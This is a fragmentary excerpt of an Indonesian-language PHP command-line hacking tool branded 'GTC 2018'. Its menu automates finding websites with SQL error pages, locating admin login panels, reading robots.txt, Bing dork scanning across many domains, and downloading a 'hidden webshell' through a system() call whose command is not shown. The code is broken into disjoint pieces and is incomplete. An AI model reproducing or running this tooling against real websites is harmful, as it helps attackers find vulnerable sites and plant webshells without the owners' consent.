...
function userinput($message){
	global $white, $bold, $greenbg, $redbg, $bluebg, $cln, $lblue, 
$green;
	$inputstyle = $cln . $bold . $lblue . "[s0s] " . $message . " => " 
. $green ;
	echo $inputstyle;
}
...
Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5");
...
Cvar1984:
echo "\n";
userinput("Web yang mao lu scan tod");
$ip = trim(fgets(STDIN, 1024));
if (strpos($ip, '://') !== false) {
    echo $bold . $red . "\n[!] Jangan pake HTTP/HTTPS Cukup Www ajah 
coeg [!]\n" . $CURLOPT_RETURNTRANSFER;
    goto Cvar1984;
  }elseif (strpos($ip, '.') == false) {
    echo $bold . $red . "\n[!] Masukin Yang Bener Goblog [!] \n" . $cln;
    goto Cvar1984;
  }elseif (strpos($ip, ' ') !== false) {
    echo $bold . $red . "\n[!] Masukin Yang Bener Goblog [!] \n" . $cln;
    goto Cvar1984;
	  ...
	  asciiart();
	  echo "$red=========================== GTC 2018 ===========================\n";
	  echo "$blue [1] SQL Error Page ( Buat Nyari Yg vuln )\n";
	  echo "$green [2] Admin Finder ( Cari admin login )\n";
	  echo "$white [3] Robots.txt ( Caritau Isi Robots.txt )\n";
	  echo "$blue [4] Bing Dorker ( Dorking Anything cuy )\n";
	  echo "$red [5] Download Hidden Webshell ( output=ini.php )\n";
	  echo "$green [B] Back ( Ganti Target lu )\n";
	  echo "$red [Q]  Quit!\n";
          echo "$yellow [+] Created By : Mr.s0s \n";
	  echo "$red=========================== GTC 2018 ===========================\n";
    userinput("Pilih Nomor nya tod");
    $pilih = trim(fgets(STDIN, 1024));
    if (!in_array($pilih, array('1','2','3','4','5','B','Q','b','q',), true)) {
        echo $bold . $red . "\n[!] Yang bener napa [!] \n\n" . $cln;
        goto aksi;
      }else {
		  if($pilih == "4") { userinput("Masukan Dork Nya");
...
$do=urlencode($dork);
        ...
        foreach ($array as $domain) { 
            echo"\n$red http://".$domain.'/';
			    echo "\n$green [!] Scanning Sukses gan. Tekan Enter untuk lanjut [!]\n";
            ...
            robots($reallink);
            echo "\n\n";
            echo "$green [!] Scanning Sukses gan. Tekan Enter untuk lanjut [!]\n";
            trim(fgets(STDIN, 1024));
            goto aksi;
          }elseif ($pilih == "5") {
			  echo "\n\n";
			  system("$download");
			   echo "$green [!] Tekan Enter untuk lanjut cuy [!]";
            trim(fgets(STDIN, 1024));
			goto aksi;
